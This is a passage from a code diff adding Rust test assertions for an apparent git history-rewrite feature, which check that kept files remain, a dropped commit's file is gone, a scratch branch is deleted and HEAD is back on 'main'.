+                "{present}.txt should have survived the rewrite"
+            );
+        }
+        assert!(
+            !repo_dir.join("D.txt").exists(),
+            "the dropped commit's file should be gone"
+        );
+        assert!(
+            git_command_output(&repo_dir, ["branch", "--list", &scratch]).is_empty(),
+            "the scratch branch should have been deleted"
+        );
+        assert_eq!(
+            git_command_output(&repo_dir, ["rev-parse", "--abbrev-ref", "HEAD"]),
+            "main"
         );
     }
 }
